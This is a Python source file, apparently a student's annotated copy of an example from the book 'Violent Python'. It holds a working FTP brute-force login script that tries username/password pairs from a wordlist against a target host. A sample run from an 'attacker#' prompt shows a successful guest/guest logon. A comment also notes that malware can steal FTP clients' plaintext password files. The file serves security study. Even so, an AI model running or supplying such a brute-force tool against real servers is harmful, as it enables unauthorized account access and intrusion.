'''
This file is part of examples shown in a book
"Violent Python Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers"
Most of the code is copied as is, or with minor changes to make naming easier to understand and some
comments may have been added where i explain to myself how everything works ( the code is not just blindly copied ).
The purpose of these files is for me to understand how the code works and become better at the security field.
------------
Antti Ruhala, Tampere University of Technology
------------
'''
'''
FTP client programs such as FileZilla, often store passwords 
in plaintext configuration files, custom malware can be made
to quickly steal these files from default locations (after succesful
access has been made)
'''
'''
this function simply bruteforces trough a
username1:password1
username2:password2
type text file and attempts logins with each row
to a knows IP address
'''

import ftplib

def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: " + userName
              + "/" + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname)
                  + ' FTP Logon succeeded: '
                  + userName + '/' + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)
host = 'xxx.yyy.zzz.abc'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)

'''
example run:
(after setting the correct IP to the code)

attacker# python FTPBruteForceLogin.py 
[+] Trying: administrator/password 
[+] Trying: admin/12345 
[+] Trying: root/secret 
[+] Trying: guest/guest 
[*] 192.168.95.179 FTP Logon Succeeded: guest/guest

'''
